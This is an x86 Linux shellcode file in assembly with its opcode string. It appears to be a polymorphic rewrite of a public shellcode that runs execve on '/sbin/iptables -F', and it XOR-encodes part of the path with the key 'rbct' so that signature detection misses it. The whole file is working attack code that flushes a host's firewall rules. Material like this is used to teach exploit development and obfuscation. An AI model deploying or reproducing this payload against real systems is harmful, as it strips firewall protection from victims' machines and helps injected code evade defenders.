; Title: Linux/x86 - iptables --flush
; Author: Robert C. Raducioiu
; Web: rbct.it
; Reference: http://shell-storm.org/shellcode/files/shellcode-825.php
; Shellcode: "\x31\xdb\xf7\xe3\x52\x66\xbf\x2d\x46\x66\x57\x89\xe7\x52\xbe\x74\x63\x62\x72\x52\x68\x62\x6c\x65\x73\x68\x1d\x13\x16\x13\x31\x34\x24\x68\x62\x69\x6e\x2f\x68\x5b\x4c\x4d\x01\x31\x34\x24\x54\x5b\x52\x57\x53\xb0\x0a\x40\x54\x59\xcd\x80"
; Length: 58 bytes

global _start

section .text

_start:

    ; clear EBX, EAX, and EDX
    xor ebx, ebx
    mul ebx
    
    ; instead of pushing EAX, push EDX
    push edx

    ; push word 0x462d
    ; instead of pushing the WORD 0x462d, use two steps
    mov di, 0x462d
    push di

    ; use edi instead of esi
    mov edi,esp
    
    ; use EBX or EDX instead of EAX
    push edx

    ; XOR key ('rbct')
    mov esi, 0x72626374

    ; NULL DWORD acting as the string terminator for
    ;   the path of the executable
    push edx

    push 0x73656c62
    
    push 0x1316131d
    xor [esp], esi

    push 0x2f6e6962

    push 0x014d4c5b
    xor [esp], esi

    ; save the pointer to the string into EBX
    push esp
    pop ebx

    ; instead of 'push eax' use 'push edx', as they are both set to 0x0 
    push edx

    push edi
    push ebx

    mov al, 0xa
    inc eax

    ; use the PUSH-POP technique instead of the MOV instruction
    push esp
    pop ecx

    ; call execve
    int 0x80
